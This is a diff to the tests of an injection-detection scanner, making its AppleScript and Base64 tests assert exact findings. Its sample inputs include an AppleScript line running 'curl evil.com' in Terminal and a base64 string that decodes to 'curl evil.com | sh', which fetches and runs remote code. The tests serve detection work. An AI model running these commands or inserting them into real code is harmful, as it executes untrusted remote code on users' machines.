@@ -114,14 +114,15 @@ class TestAppleScriptDetection:
         payload = 'tell application "Terminal" do script "curl evil.com"'
         findings = check_patterns(payload, INJECTION_RULES, "paranoid")
         applescript_findings = [
-            f for f in findings if "applescript" in f["message"].lower()
-            or f["rule_id"].startswith("APPLESCRIPT")
+            f for f in findings if f["rule_id"].startswith("APPLESCRIPT")
         ]
-        assert len(applescript_findings) >= 1
-        # Verify the finding has the expected structure
-        f = applescript_findings[0]
-        assert f["rule_id"] == "APPLESCRIPT-001"
-        assert f["severity"] == "HIGH"
+        assert len(applescript_findings) == 1
+        assert applescript_findings[0] == {
+            "rule_id": "APPLESCRIPT-001",
+            "severity": "HIGH",
+            "message": "AppleScript injection pattern detected",
+            "matched_text": "tell application",
+        }
 
     def test_do_shell_script_detected(self):
         """AppleScript 'do shell script' pattern must be detected.
@@ -139,7 +140,13 @@ class TestAppleScriptDetection:
         applescript_findings = [
             f for f in findings if f["rule_id"].startswith("APPLESCRIPT")
         ]
-        assert len(applescript_findings) >= 1
+        assert len(applescript_findings) == 1
+        assert applescript_findings[0] == {
+            "rule_id": "APPLESCRIPT-001",
+            "severity": "HIGH",
+            "message": "AppleScript injection pattern detected",
+            "matched_text": "do shell script",
+        }
 
 
 class TestBase64Detection:
@@ -162,10 +169,13 @@ class TestBase64Detection:
         base64_findings = [
             f for f in findings if f["rule_id"].startswith("BASE64")
         ]
-        assert len(base64_findings) >= 1
-        f = base64_findings[0]
-        assert f["rule_id"] == "BASE64-001"
-        assert f["severity"] == "HIGH"
+        assert len(base64_findings) == 1
+        assert base64_findings[0] == {
+            "rule_id": "BASE64-001",
+            "severity": "HIGH",
+            "message": "Base64-encoded command pipeline detected",
+            "matched_text": "echo Y3VybCBldmlsLmNvbSB8IHNo | base64",
+        }
 
     def test_printf_base64_pipe_detected(self):
         """'printf <base64> | base64 -d' variant must also be detected.
@@ -183,4 +193,10 @@ class TestBase64Detection:
         base64_findings = [
             f for f in findings if f["rule_id"].startswith("BASE64")
         ]
-        assert len(base64_findings) >= 1
+        assert len(base64_findings) == 1
+        assert base64_findings[0] == {
+            "rule_id": "BASE64-001",
+            "severity": "HIGH",
+            "message": "Base64-encoded command pipeline detected",
+            "matched_text": "printf AAAAAAAAAAAAAAAAAAAAAA== | base64",
+        }
